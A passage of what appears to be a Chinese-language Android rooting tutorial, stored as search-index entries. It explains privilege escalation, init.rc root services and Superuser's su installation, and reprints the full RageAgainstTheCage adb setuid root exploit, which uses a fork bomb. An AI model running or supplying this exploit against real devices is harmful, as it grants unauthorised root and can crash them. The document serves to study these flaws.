\u8fd9\u65f6\u91cd\u65b0\u7528adb\u8fde\u63a5\u8bbe\u5907\uff0c\u5219adb\u5c06\u4f1a\u8fd0\u884c\u5728root\u6743\u9650\u4e0b\u9762\u4e86\u3002 \u901a\u8fc7\u4e0a\u9762\u7684\u4ecb\u7ecd\u6211\u4eec\u53d1\u73b0\u5229\u7528RageAgainstTheCage\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u4f7fadbd\u83b7\u5f97root\u6743\u9650\uff0c\u4e5f\u5c31\u662fadb\u83b7\u5f97\u4e86root\u6743\u9650\u3002\u62ff\u5230root\u6743\u9650\u5269\u4e0b\u7684\u95ee\u9898\u5c31\u597d\u529e\u4e86\uff0c\u590d\u5236\u7834\u89e3\u4e4b\u540e\u7684su\u7a0b\u5e8f\u5230\u7cfb\u7edf\u4e2d\uff0c\u90fd\u662f\u6ca1\u6709\u4ec0\u4e48\u6280\u672f\u542b\u91cf\u7684\u4e8b\u60c5\u4e86\u3002 \u5176\u5b9e\u5835\u4f4fadbd\u7684\u8fd9\u4e2a\u6f0f\u6d1e\u5176\u5b9e\u4e5f\u633a\u7b80\u5355\u7684\uff0c\u65b0\u7248\u672c\u5df2\u7ecf\u52a0\u4e24\u4e2a\u8fd9\u4e2a\u8865\u4e01\u3002 1:/* then switch user and group to \"shell\" */ 2:if (setgid(AID_SHELL) != 0) { 3: exit(1); 4: } 5:if (setuid(AID_SHELL) != 0) { 6: exit(1); 7: } \u5982\u679c\u53d1\u73b0setgid\u548csetuid\u51fd\u6570\u6267\u884c\u5931\u8d25\uff0c\u5219adbd\u8fdb\u7a0b\u5f02\u5e38\u9000\u51fa\uff0c\u5c31\u628a\u8fd9\u4e2a\u6f0f\u6d1e\u7ed9\u5835\u4e0a\u4e86\u3002 http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2607 http://blog.claudxiao.net/wp-content/uploads/2011/04/rageagainstthecage.c /* android 1.x/2.x adb setuid() root exploit * (C) 2010 The Android Exploid Crew * * Needs to be executed via adb -d shell. It may take a while until * all process slots are filled and the adb connection is reset. * * !!!This is PoC code for educational purposes only!!! * If you run it, it might crash your device and make it unusable! * So you use it at your own risk! */ #include <stdio.h> #include <sys/types.h> #include <sys/time.h> #include <sys/resource.h> #include <unistd.h> #include <fcntl.h> #include <errno.h> #include <string.h> #include <signal.h> #include <stdlib.h> void die(const char *msg) { perror(msg); exit(errno); } pid_t find_adb() { char buf[256]; int i = 0, fd = 0; pid_t found = 0; for (i = 0; i < 32000; ++i) { sprintf(buf, \"/proc/%d/cmdline\", i); if ((fd = open(buf, O_RDONLY)) < 0) continue; memset(buf, 0, sizeof(buf)); read(fd, buf, sizeof(buf) - 1); close(fd); if (strstr(buf, \"/sbin/adb\")) { found = i; break; } } return found; } void restart_adb(pid_t pid) { kill(pid, 9); } void wait_for_root_adb(pid_t old_adb) { pid_t p = 0; for (;;) { p = find_adb(); if (p != 0 && p != old_adb) break; sleep(1); } sleep(5); kill(-1, 9); } int main(int argc, char **argv) { pid_t adb_pid = 0, p; int pids = 0, new_pids = 1; int pepe[2]; char c = 0; struct rlimit rl; printf(\"[*] CVE-2010-EASY Android local root exploit (C) 2010 by 743C\\n\\n\"); printf(\"[*] checking NPROC limit ...\\n\"); if (getrlimit(RLIMIT_NPROC, &rl) < 0) die(\"[-] getrlimit\"); if (rl.rlim_cur == RLIM_INFINITY) { printf(\"[-] No RLIMIT_NPROC set. Exploit would just crash machine. Exiting.\\n\"); exit(1); } printf(\"[+] RLIMIT_NPROC={%lu, %lu}\\n\", rl.rlim_cur, rl.rlim_max); printf(\"[*] Searching for adb ...\\n\"); adb_pid = find_adb(); if (!adb_pid) die(\"[-] Cannot find adb\"); printf(\"[+] Found adb as PID %d\\n\", adb_pid); printf(\"[*] Spawning children. Dont type anything and wait for reset!\\n\"); printf(\"[*]\\n[*] If you like what we are doing you can send us PayPal money to\\n\" \"[*] 7-4-3-C@web.de so we can compensate time, effort and HW costs.\\n\" \"[*] If you are a company and feel like you profit from our work,\\n\" \"[*] we also accept donations > 1000 USD!\\n\"); printf(\"[*]\\n[*] adb connection will be reset. restart adb server on desktop and re-login.\\n\"); sleep(5); if (fork() > 0) exit(0); setsid(); pipe(pepe); /* generate many (zombie) shell-user processes so restarting * adb's setuid() will fail. * The whole thing is a bit racy, since when we kill adb * there is one more process slot left which we need to * fill before adb reaches setuid(). Thats why we fork-bomb * in a seprate process. */ if (fork() == 0) { close(pepe[0]); for (;;) { if ((p = fork()) == 0) { exit(0); } else if (p < 0) { if (new_pids) { printf(\"\\n[+] Forked %d childs.\\n\", pids); new_pids = 0; write(pepe[1], &c, 1); close(pepe[1]); } } else { ++pids; } } } close(pepe[1]); read(pepe[0], &c, 1); restart_adb(adb_pid); if (fork() == 0) { fork(); for (;;) sleep(0x743C); } wait_for_root_adb(adb_pid); return 0; }","title":"Android\u7cfb\u7edfroot\u7834\u89e3\u539f\u7406\u5206\u6790"},{"location":"Android/Android%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E5%92%8Croot%E6%9D%83%E9%99%90/#android_1","text":"\u5728Android\u7cfb\u7edf\u4e2d\uff0c\u7cfb\u7edf\u4e3a\u6bcf\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\uff08apk\uff09\u521b\u5efa\u4e86\u4e00\u4e2a\u7528\u6237\u548c\u7ec4\u3002\u8fd9\u4e2a\u7528\u6237\u548c\u7ec4\u90fd\u662f\u53d7\u9650\u7528\u6237\uff0c\u4e0d\u80fd\u8bbf\u95ee\u7cfb\u7edf\u7684\u6570\u636e\uff0c\u53ea\u80fd\u8bbf\u95ee\u81ea\u5df1\u7684\u6587\u4ef6\u548c\u76ee\u5f55\uff0c\u5f53\u7136\u5b83\u4e5f\u4e0d\u80fd\u8bbf\u95ee\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u7684\u6570\u636e\u3002\u8fd9\u6837\u8bbe\u8ba1\u53ef\u4ee5\u5c3d\u53ef\u80fd\u5730\u4fdd\u62a4\u5e94\u7528\u7a0b\u5e8f\u7684\u79c1\u6709\u6570\u636e\uff0c\u589e\u5f3a\u7cfb\u7edf\u7684\u5b89\u5168\u6027\u548c\u5065\u58ee\u6027\u3002 \u4f46\u662f\u6709\u4e00\u4e9b\u5e94\u7528\u7a0b\u5e8f\u662f\u9700\u8981\u8bbf\u95ee\u4e00\u4e9b\u7cfb\u7edf\u8d44\u6e90\u7684\u3002\u6bd4\u5982Setting\u7a0b\u5e8f\uff0c\u5b83\u9700\u8981\u8bbf\u95eeWiFi\uff0c\u5728\u7cfb\u7edf\u4e2d\u521b\u5efa\u5220\u9664\u6587\u4ef6\u7b49\u7b49\u64cd\u4f5c\u3002\u600e\u6837\u505a\u5230\u8fd9\u4e00\u70b9\u513f\u5462\uff1fAndroid\u901a\u8fc7\u4e00\u5b9a\u9014\u5f84\u53ef\u4ee5\u83b7\u5f97system\u6743\u9650\u3002\u83b7\u5f97system\u7528\u6237\u6743\u9650\uff0c\u9700\u8981\u4ee5\u4e0b\u6b65\u9aa4\uff1a 1. \u5728\u5e94\u7528\u7a0b\u5e8f\u7684AndroidManifest.xml\u4e2d\u7684manifest\u8282\u70b9\u4e2d\u52a0\u5165android:sharedUserId=\"android.uid.system\"\u8fd9\u4e2a\u5c5e\u6027\u3002 2. \u4fee\u6539Android.mk\u6587\u4ef6\uff0c\u52a0\u5165LOCAL_CERTIFICATE := platform\u8fd9\u4e00\u884c 3. \u4f7f\u7528mm\u547d\u4ee4\u6765\u7f16\u8bd1\uff0c\u751f\u6210\u7684apk\u5c31\u6709\u4fee\u6539\u7cfb\u7edf\u65f6\u95f4\u7684\u6743\u9650\u4e86\u3002 \u4e00\u822c\u60c5\u51b5\u4e0bsystem\u7528\u6237\u53ef\u4ee5\u5728\u7cfb\u7edf\u4e2d\u521b\u5efa\u548c\u5220\u9664\u6587\u4ef6\uff0c\u8bbf\u95ee\u8bbe\u5907\u7b49\u7b49\u3002\u4f46\u662f\u6709\u4e9b\u60c5\u51b5\u4e0bsystem\u6743\u9650\u8fd8\u662f\u4e0d\u591f\u7684\u3002\u6bd4\u5982\uff1a\u8bbe\u7f6e\u7f51\u5361IP\u5730\u5740\uff0cifconfig\u547d\u4ee4\u662f\u9700\u8981root\u6743\u9650\u7684\u3002\u6211\u53ef\u4ee5\u5f88\u80af\u5b9a\u7684\u8bf4\uff0c\u5728Android\u4e0b\u9762\u5e94\u7528\u7a0b\u5e8f\u662f\u6ca1\u6709\u53ef\u80fd\u62ff\u5230root\u6743\u9650\u7684\u3002\u4f46\u662f\u5982\u679c\u6211\u7684\u5e94\u7528\u7a0b\u5e8f\u9700\u8981root\u6743\u9650\u600e\u4e48\u529e\u5462\uff1f\u53ea\u80fd\u60f3\u529e\u6cd5\u7ed5\u822c\u8fc7\u53bb\u3002\u5c31\u4ee5\u6211\u7684\u95ee\u9898\u4e3a\u4f8b\uff0c\u8bbe\u7f6e\u7f51\u5361IP\u5730\u5740\uff0croot\u6743\u9650\u4e0b\u9762\u547d\u4ee4\u4e3a\uff1a ifconfig eth0 192.168.1.188 \u5728\u666e\u901a\u7528\u6237\u6216\u8005system\u7528\u6237\u6743\u9650\u4e0b\u9762\u8fd9\u6761\u547d\u4ee4\u662f\u4e0d\u8d77\u4f5c\u7528\u7684\uff0c\u4f46\u662f\u4e0d\u4f1a\u8fd4\u56de\u5931\u8d25\u548c\u5f02\u5e38\uff0c\u90a3\u4e48\u600e\u6837\u5b9e\u73b0\u8fd9\u4e2a\u529f\u80fd\u5462\u3002 1\u3001\u7cfb\u7edf\u542f\u52a8\u7684\u65f6\u5019init\u8fdb\u7a0b\u521b\u5efa\u4e00\u4e2a\u540e\u53f0\u8fdb\u7a0b\uff0c\u8be5\u8fdb\u7a0b\u5904\u4e8eroot\u7528\u6237\u6743\u9650\u4e0b\u9762\u3002\u7528\u6765\u76d1\u542c\u7cfb\u7edf\u4e2d\u5e94\u7528\u7a0b\u5e8f\u7684\u8bf7\u6c42\uff08\u53ef\u4ee5\u7528socket\u5b9e\u73b0\uff09\uff0c\u5e76\u4ee3\u5176\u5b8c\u6210\u3002\u8fd9\u6837\u5e94\u7528\u7a0b\u5e8f\u5c31\u53ef\u4ee5\u6267\u884croot\u7528\u6237\u6743\u9650\u7684\u4efb\u52a1\u4e86\u3002 2\u3001\u5b9e\u73b0\u4e00\u4e2a\u865a\u62df\u7684\u8bbe\u5907\uff0c\u8be5\u8bbe\u5907\u7684\u529f\u80fd\u5c31\u662f\u5728\u5185\u6838\u6001\u5e2e\u5e94\u7528\u7a0b\u5e8f\u6267\u884c\u76f8\u5e94\u7684\u547d\u4ee4\u3002Linux\u5185\u6838\u6001\u6ca1\u6709\u6743\u9650\u7684\u95ee\u9898\u4e86\u3002\u80af\u5b9a\u53ef\u4ee5\u6267\u884c\u6210\u529f\u3002 \u89e3\u51b3\u8bbe\u7f6e\u7f51\u5361IP\u5730\u5740\u95ee\u9898\u65f6\uff0c\u9009\u62e9\u662f\u540e\u8005\u76f8\u5bf9\u6765\u8bf4\u8bbe\u8ba1\u6bd4\u8f83\u7b80\u5355\u3002","title":"Android\u7a0b\u5e8f\u7684\u5b89\u5168\u7cfb\u7edf"},{"location":"Android/Android%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E5%92%8Croot%E6%9D%83%E9%99%90/#androidinitrc-serviceroot","text":"\u53d1\u5e03\u4e8e: \u60f3\u5728android\u5e94\u7528\u7a0b\u5e8f\u4e2d\u52a8\u6001mount\u4e00\u4e2aNFS\u7684\u7cfb\u7edf\uff0c\u4f46\u662f\u6267\u884cmount\u547d\u4ee4\u5fc5\u987b\u8981root\u6743\u9650\u624d\u53ef\u4ee5\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u5728Android\u7684APK\u5c42\u662f\u4e0d\u80fd\u83b7\u5f97root\u6743\u9650\u7684\u3002 \u4e0a\u4e00\u8282\u63d0\u5230\u5b9e\u73b0\u7531init\u542f\u52a8\u7684Service\uff0c\u6765\u5e2e\u52a9Android\u5e94\u7528\u7a0b\u5e8f\u6267\u884croot\u6743\u9650\u7684\u547d\u4ee4\u6216\u8005\u5b9e\u73b0\u4e00\u4e2a\u865a\u62df\u8bbe\u5907\uff0c\u8fd9\u4e2a\u8bbe\u5907\u5e2e\u52a9Android\u5e94\u7528\u7a0b\u5e8f\u6267\u884croot\u6743\u9650\u7684\u547d\u4ee4\u3002 \u672c\u6587\u5c06\u4f1a\u9009\u62e9\u7b2c\u4e00\u79cd\u6765\u89e3\u51b3Android\u5e94\u7528\u7a0b\u5e8fmount NFS\u6587\u4ef6\u7cfb\u7edf\u7684\u95ee\u9898\u3002 Init.rc Service \u5728Android\u7cfb\u7edfinit.rc\u4e2d\u5b9a\u4e49\u5f88\u591aService\uff0cInit.rc\u4e2d\u5b9a\u4e49\u7684Service\u5c06\u4f1a\u88abInit\u8fdb\u7a0b\u521b\u5efa\uff0c\u8fd9\u6837\u5c06\u53ef\u4ee5\u83b7\u5f97root\u6743\u9650\u3002 \u8bbe\u7f6e\u7cfb\u7edf\u5c5e\u6027\u201cctl.start\u201d\uff0c\u628a\u201cctl.start\u201d\u8bbe\u7f6e\u4e3a\u4f60\u8981\u8fd0\u884c\u7684Service\uff0c\u5047\u8bbe\u4e3a\u201cxxx\u201d\uff0cAndroid\u7cfb\u7edf\u5c06\u4f1a\u5e2e\u4f60\u8fd0\u884c\u201cctl.start\u201d\u7cfb\u7edf\u5c5e\u6027\u4e2d\u6307\u5b9a\u7684Service\u3002\u90a3\u4e48\u8fd0\u884c\u7ed3\u679cinit\u8fdb\u7a0b\u4f1a\u5199\u5165\u547d\u540d\u4e3a\u201cinit.svc.+xxx\u201d\u7684\u7cfb\u7edf\u5c5e\u6027\u4e2d\uff0c\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u53c2\u8003\u67e5\u9605\u8fd9\u4e2a\u503c\u6765\u786e\u5b9aService xxx\u6267\u884c\u7684\u60c5\u51b5\u3002 Android\u7cfb\u7edf\u5c5e\u6027(property)\u6743\u9650 \u96be\u9053Android\u5c5e\u6027\u201cctl.start\u201d\u4e0d\u662f\u6240\u6709\u8fdb\u7a0b\u90fd\u53ef\u4ee5\u8bbe\u7f6e\u7684\uff0c\u89c1property_service.c\u4e2d\u7684\u6e90\u7801\uff0c\u8bbe\u7f6eAndroid\u7cfb\u7edf\u5c5e\u6027\u7684\u51fd\u6570\u4e3ahandle_property_set_fd(),\u4ece\u6e90\u7801\u4e2d\u53ef\u4ee5\u53d1\u73b0\u5982\u679c\u8bbe\u7f6e\u201cctl.\u201d\u5f00\u5934\u7684Android\u7cfb\u7edf\u5c5e\u6027\uff0c\u5c06\u4f1a\u8c03\u7528check_control_perms\u51fd\u6570\u6765\u68c0\u67e5\u8c03\u7528\u8005\u7684\u6743\u9650\uff0c\u53ea\u6709root\u6743\u9650\u548csystem\u6743\u9650\u7684\u5e94\u7528\u7a0b\u5e8f\u624d\u53ef\u4ee5\u4fee\u6539\u201cctl.\u201d\u5f00\u5934\u7684Android\u7cfb\u7edf\u5c5e\u6027\u3002\u5426\u5219\u5c06\u4f1a\u68c0\u67e5control_perms\u5168\u5c40\u53d8\u91cf\u4e2d\u7684\u5b9a\u4e49\u6743\u9650\u548cService\u3002 \u4ece\u4ee3\u7801\u4e2d\u53ef\u4ee5\u770b\u5230\uff0c\u4efb\u4f55\u4e0d\u4ee5property_perms[] \u4e2d\u5b9a\u4e49\u7684\u524d\u7f00\u5f00\u5934\u7684property \u662f\u65e0\u6cd5\u88ab\u9664root\u4ee5\u5916\u7684\u7528\u6237\u8bbf\u95ee\u7684\uff0c\u5305\u62ecsystem\u7528\u6237\u3002 \u5b9e\u4f8b \u4e0b\u9762\u4ee5\u4e0a\u9762\u63d0\u51fa\u7684mount nfs\u6587\u4ef6\u7cfb\u7edf\u4e3a\u4f8b\u8bf4\u660e\uff1a A\uff0e \u9996\u5148\u5b9a\u4e49\u4e00\u4e2a\u6267\u884cmount\u7684\u811a\u672c\uff0c\u6211\u628a\u5b83\u4f4d\u4e8e/system/etc/mount_nfs.sh\uff0c\u5b9a\u4e49\u5982\u4e0b\uff1a 1: #\uff01/system/bin/sh 2: 3: /system/bin/busybox mount -o rw,nolock -t nfs 192.168.1.6:/nfs_srv /data/mnt \u4e0d\u8981\u5fd8\u4e86\u628a\u5b83\u52a0\u4e0a\u53ef\u6267\u884c\u6743\u9650\u3002 B\uff0e \u5728init.rc\u4e2d\u52a0\u5165\u4e00\u4e2aService\u5b9a\u4e49\uff0c\u5b9a\u4e49\u5982\u4e0b\uff1a 1: service mount_nfs /system/etc/mount_nfs.sh 2: oneshot 3: disabled C\uff0e \u8ba9\u81ea\u5df1\u7684\u5e94\u7528\u7a0b\u5e8f\u83b7\u5f97system\u6743\u9650,\u65b9\u6cd5\u89c1\u524d\u9762\u7ae0\u8282 D. \u5728\u81ea\u5df1\u5e94\u7528\u7a0b\u5e8f\u4e2d\u8bbe\u7f6eSystem\u7cfb\u7edf\u5c5e\u6027\u201cctl.start\u201d\u4e3a\u201cmount_nfs\u201d\uff0c\u8fd9\u6837Android\u7cfb\u7edf\u5c06\u4f1a\u5e2e\u6211\u4eec\u8fd0\u884cmount_nfs\u7cfb\u7edf\u5c5e\u6027\u4e86\u3002\u4e0d\u80fd\u591f\u8c03\u7528System.getProperty\uff0c\u8fd9\u4e2a\u51fd\u6570\u53ea\u662f\u4fee\u6539JVM\u4e2d\u7684\u7cfb\u7edf\u5c5e\u6027\u3002\u53ea\u80fd\u8c03\u7528android.os.SystemProperties\uff0c\u6700\u7ec8\u901a\u8fc7JNI\u8c03\u7528C/C++\u5c42\u7684API property_get\u548cproperty_set\u51fd\u6570\u3002 SystemProperties.set(\"ctl.start\",\"mount_nfs\"); E. \u6700\u540e\u5728\u81ea\u5df1\u5e94\u7528\u7a0b\u5e8f\u4e2d\uff0c\u8bfb\u53d6\u201cinit.svc.mount_nfs\u201dAndroid\u7cfb\u7edfProperty\uff0c\u68c0\u67e5\u6267\u884c\u7ed3\u679c\u3002\u4ee3\u7801\u5982\u4e0b\uff1a 1:while(true) 2: { 3: mount_rt = SystemProperties.get(\"init.svc.mount_nfs\",\"\"); 4: if(mount_rt != null && mount_rt.equals(\"stopped\")) 5: { 6: return true; 7: } 8: 9: try 10: { 11: Thread.sleep(1000); 12: }catch(Exception ex){ 13: Log.e(TAG,\"Exception: \" + ex.getMessage()); 14: } 15: } init\u8fdb\u7a0b\u7ef4\u62a4\u4e00\u4e2aservice\u7684\u961f\u5217\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u8f6e\u8bad\u6765\u67e5\u8be2service\u7684\u6267\u884c\u7ed3\u679c\u3002 1. \u6587\u4ef6(\u5939)\u8bfb\u5199\u6743\u9650 init.rc \u4e2d\u5efa\u7acbtest1 test2 test3\u6587\u4ef6\u5939 mkdir /data/misc/test1 0770 root root mkdir /data/misc/test2 0770 wifi wifi mkdir /data/misc/test3 0770 system misc \u5176\u4e2d test1 \u76ee\u5f55\u7684owner\u662froot, group\u4e5f\u662froot test2 \u76ee\u5f55\u7684owner\u662fwifi , group\u4e5f\u662fwifi test3 \u76ee\u5f55\u7684owner\u662fsystem , group\u662fmisc \uff08\u4efb\u4f55\u7528\u6237\u90fd\u5c5e\u4e8egroup misc\uff09 service xxxx /system/bin/xxxx user root disabled oneshot service yyyy /system/bin/yyyy user system disabled oneshot service zzzz /system/bin/zzzz user wifi disabled oneshot \u7ed3\u679c: xxxx \u670d\u52a1\u53ef\u4ee5\u8bbf\u95ee test1, test2, test3 yyyy \u670d\u52a1\u53ef\u4ee5\u8bbf\u95ee test3 zzzz \u670d\u52a1\u53ef\u4ee5\u8bbf\u95ee test2, test3 \u89c1android_filesystem_config.h\u4e2d\u5b9a\u4e49AID_ROOT AID_SYSTEM AID_MISC\u7b49\u5b8f\u5b9a\u4e49\u7684\u6743\u9650 360\u7b49\u7279\u6b8a\u7cfb\u7edf\u662f\u5426\u53ef\u4ee5\u8003\u8651\u5728AID_ROOT\u548cAID_SYSTEM\u4e4b\u95f4\u52a0\u4e00\u4e2a\u6743\u9650\u548c\u7528\u6237,\u589e\u52a0\u65b0\u7684\u54e6 property\u7ed9360\u7528?**** \u901a\u8fc7\u4e0a\u9762\u7684\u8fd9\u4e9b\u6b65\u9aa4\uff0cAndroid\u5e94\u7528\u7a0b\u5e8f\u5c31\u80fd\u591f\u8c03\u7528init.rc\u4e2d\u5b9a\u4e49\u7684Service\u4e86\u3002\u8fd9\u6837\u4f60\u7684Android\u5e94\u7528\u7a0b\u5e8f\u4e5f\u5c31\u83b7\u5f97\u4e86root\u6743\u9650\u3002\u524d\u63d0\u662fAndroid\u7cfb\u7edf\u5f00\u53d1\u4eba\u5458\uff0c\u5426\u5219\u4f60\u65e0\u6cd5\u4fee\u6539init.rc\u7b49\u6587\u4ef6,\u800c\u4e14\u5e94\u7528\u7a0b\u5e8f\u5fc5\u987b\u8981\u83b7\u5f97system\u6743\u9650\u3002","title":"Android\u5e94\u7528\u7a0b\u5e8f\u5229\u7528init.rc service\u83b7\u5f97root\u6743\u9650"},{"location":"Android/Android%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E5%92%8Croot%E6%9D%83%E9%99%90/#android-superuserapkroot","text":"\u539f\u7406\u662f\u5229\u7528\u4e86android\u7684\u4e24\u4e2a\u63d0\u6743\u6f0f\u6d1e\uff1a CVE-2010-EASY\u548c ZergRush\u3002 \u6211\u628a\u5927\u6982\u539f\u7406\u7b80\u5355\u8bf4\u8bf4\uff1a 1\uff0c CVE-2010-EASY\uff1a linux\u7684\u5185\u6838\u7684\u6a21\u5757\u5316\u7a0b\u5ea6\u5f88\u9ad8\uff0c\u5f88\u591a\u529f\u80fd\u6a21\u5757\u662f\u9700\u8981\u5230\u65f6\u5019\u518d\u52a0\u8f7d\uff0c\u5728 android\u4e2d\u7531init\u8fdb\u7a0b\u6765\u7ba1\u7406\u8fd9\u4e9b\u7684\u3002\u4f46\u662f\u8fd9\u4e2ainit\u8fdb\u7a0b\u4e0d\u4f1a\u68c0\u6d4b\u53d1\u7ed9\u5b83\u7684\u6307\u4ee4\u7684\u6765\u6e90\uff0c\u4e0d\u7ba1\u662f\u5185\u6838\u53d1\u9001\u7684\uff0c\u8fd8\u662f\u7528\u6237\u53d1\u9001\u7684\uff0c\u5b83\u90fd\u6267\u884c\u4e0d\u8bef\uff0c\u4f1a\u987a\u4ece\u7684\u53bb\u52a0\u8f7d\u6216\u5378\u8f7d\u4e00\u4e9b\u6a21\u5757\uff0c\u800c\u52a0\u8f7d\u7684\u6a21\u5757\u90fd\u662f\u4ee5root\u8eab\u4efd\u8fd0\u884c\u7684\u3002\u56e0\u6b64\u4f60\u53ef\u4ee5\u7ed9\u5b83\u51c6\u5907\u4e00\u4e2a\u7cbe\u5fc3\u5236\u4f5c\u7684\u529f\u80fd\u6a21\u5757(ko\u6587\u4ef6)\uff0c\u7136\u540e\u89e6\u53d1\u76f8\u5e94\u7684\u52a0\u8f7d\u6761\u4ef6\uff0c\u6bd4\u5982\u70ed\u62d4\u63d2\u3001\u5f00\u5173wifi\u7b49\u7b49\uff0c \u8be5\u529f\u80fd\u6a21\u5757\u8fd0\u884c\u540e\uff0c\u4f1a\u751f\u6210 /data/local/tmp/rootshell \u4e00\u4e2a\u5e26s\u4f4d\u7684shell\u3002 2\uff0cZergRush\u539f\u7406\uff1a \u5177\u6709root\u6743\u9650\u7684vold\u8fdb\u7a0b\u4f7f\u7528\u4e86libsysutils.so\u5e93\uff0c\u8be5\u5e93\u6709\u4e2a\u51fd\u6570\u5b58\u5728\u6808\u6ea2\u51fa\uff0c\u56e0\u6b64\u53ef\u4ee5root\u6743\u9650\u6267\u884c\u8f93\u5165\u7684shellcode\u3002 3. \u8fd8\u6709\u4e2a\u524d\u9762\u63d0\u5230\u7684adb\u63d0\u6743\u6f0f\u6d1e\uff0c\u4e0d\u591f\u65b0\u7248\u672c\u5df2\u7ecf\u4fee\u6b63\u4e86\u3002 \u626f\u4e86\u534a\u5929\u8fd8\u6ca1\u626f\u5230superuser.apk\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u662froot\u6210\u529f\u540e\uff0c\u4e13\u95e8\u7528\u6765\u7ba1\u7406root\u6743\u9650\u4f7f\u7528\u7684\uff0c\u9632\u6b62\u88ab\u6076\u610f\u7a0b\u5e8f\u6ee5\u7528\u3002 \u6e90\u7801\u5730\u5740\uff1a http://superuser.googlecode.com/svn/trunk \u5e26\u7740\u4e24\u4e2a\u95ee\u9898\u6211\u4eec\u6765\u5206\u6790\u6e90\u7801\uff1a 1\u3001superuser\u662f\u600e\u4e48\u77e5\u9053\u8c01\u60f3\u7528root\u6743\u9650\uff1f 2\u3001superuser\u662f\u5982\u4f55\u628a\u7528\u6237\u7684\u9009\u62e9\u544a\u8bc9su\u7a0b\u5e8f\u7684\u90a3\uff1f \u5373superuser\u548csu\u7a0b\u5e8f\u662f\u5982\u4f55\u901a\u8baf\u7684\uff0c\u4ed6\u4eec\u4fe9\u4f4d\u4e8e\u4e0d\u901a\u7684\u65f6\u7a7a\uff0c\u4e00\u4e2a\u5728java\u865a\u62df\u673a\u4e2d\uff0c\u4e00\u4e2a\u5728linux\u7684\u771f\u5b9e\u8fdb\u7a0b\u4e2d\u3002 \u5171\u6709\u4e24\u4e2aactive: SuperuserActivity\u548c SuperuserRequestActivity\u3002 \u5176\u4e2dSuperuserActivity\u4e3b\u8981\u662f\u7528\u6765\u7ba1\u7406\u767d\u540d\u5355\u7684\uff0c\u5c31\u662f\u8bb0\u4f4f\u54ea\u4e2a\u7a0b\u5e8f\u5df2\u7ecf\u88ab\u5141\u8bb8\u4f7f\u7528root\u6743\u9650\u4e86\uff0c\u7701\u7684\u6bcf\u6b21\u7528\u65f6\u90fd\u95ee\u7528\u6237\u3002 SuperuserRequestActivity \u5c31\u662f\u7528\u6765\u8be2\u95ee\u7528\u6237\u76ee\u524d\u6709\u4e2a\u7a0b\u5e8f\u60f3\u4f7f\u7528root\u6743\u9650\uff0c\u662f\u5426\u5141\u8bb8\uff0c\u662f\u5426\u4e00\u76f4\u5141\u8bb8\uff0c\u5373\u653e\u5165\u767d\u540d\u5355\u3002 \u8fd9\u4e2a\u767d\u540d\u5355\u6bd4\u8f83\u5173\u952e\uff0c\u662f\u4e00\u4e2asqlite\u6570\u636e\u5e93\u6587\u4ef6\uff0c\u4f4d\u7f6e\uff1a /data/data/com.koushikdutta.superuser/databases/superuser.sqlite root\u7684\u672c\u8d28\u5c31\u662f\u5f80 /system/bin/\u4e0b\u653e\u4e00\u4e2a\u5e26s\u4f4d\u7684\uff0c\u4e0d\u68c0\u67e5\u8c03\u7528\u8005\u6743\u9650\u7684su\u6587\u4ef6\u3002\u666e\u901a\u7a0b\u5e8f\u53ef\u4ee5\u8c03\u7528\u8be5su\u6765\u8fd0\u884croot\u6743\u9650\u7684\u547d\u4ee4\u3002superuser.apk\u4e2d\u5c31\u81ea\u5e26\u4e86\u4e00\u4e2a\u8fd9\u6837\u7684su\u7a0b\u5e8f\u3002\u4e00\u5f00\u59cbsuperuser\u4f1a\u68c0\u6d4b/system/bin/su\u662f\u5426\u5b58\u5728\uff0c\u662f\u5426\u662f\u81ea\u4e2a\u653e\u8fdb\u53bb\u7684su: File su = new File(\"/system/bin/su\"); // \u68c0\u6d4bsu\u6587\u4ef6\u662f\u5426\u5b58\u5728,\u5982\u679c\u4e0d\u5b58\u5728\u5219\u76f4\u63a5\u8fd4\u56de if (!su.exists()) { Toast toast = Toast.makeText(this, \"Unable to find /system/bin/su.\", Toast.LENGTH_LONG); toast.show(); return; } //\u68c0\u6d4bsu\u6587\u4ef6\u7684\u5b8c\u6574\u6027\uff0c\u6bd4\u8f83\u5927\u5c0f\uff0c\u592a\u7701\u4e8b\u4e86\u5427 //\u5982\u679c\u5927\u5c0f\u4e00\u6837\uff0c\u5219\u8ba4\u4e3asu\u6587\u4ef6\u6b63\u786e\uff0c\u76f4\u63a5\u8fd4\u56de\u4e86\u4e8b\u3002 if (su.length() == suStream.available()) { suStream.close(); return; } // \u5982\u679c\u68c0\u6d4b\u5230/system/bin/su \u6587\u4ef6\u5b58\u5728\uff0c\u4f46\u662f\u4e0d\u5bf9\u5934\uff0c\u5219\u628a\u81ea\u5e26\u7684su\u5148\u5199\u5230\"/data/data/com.koushikdutta.superuser/su\" // \u518d\u5199\u5230/system/bin/su\u3002 byte[] bytes = new byte[suStream.available()]; DataInputStream dis = new DataInputStream(suStream); dis.readFully(bytes); FileOutputStream suOutStream = new FileOutputStream(\"/data/data/com.koushikdutta.superuser/su\"); suOutStream.write(bytes); suOutStream.close(); Process process = Runtime.getRuntime().exec(\"su\"); DataOutputStream os = new DataOutputStream(process.getOutputStream()); os.writeBytes(\"mount -oremount,rw /dev/block/mtdblock3 /system\\n\"); os.writeBytes(\"busybox cp /data/data/com.koushikdutta.superuser/su /system/bin/su\\n\"); os.writeBytes(\"busybox chown 0:0 /system/bin/su\\n\"); os.writeBytes(\"chmod 4755 /system/bin/su\\n\"); os.writeBytes(\"exit\\n\"); os.flush(); \u4e0a\u9762\u63d0\u5230\u7684su\u80af\u5b9a\u662f\u52a8\u8fc7\u624b\u811a\u7684,\u6709\u8fdb\u7a0b\u4f7f\u7528root\u6743\u9650\uff0csuperuser\u662f\u600e\u4e48\u77e5\u9053\u7684\uff0c\u770b\u5b8csu\u7684\u4ee3\u7801\u660e\u767d\u4e86\uff0c\u5173\u952e\u662f\u53e5\uff1a sprintf(sysCmd, \"am start -a android.intent.action.MAIN -n 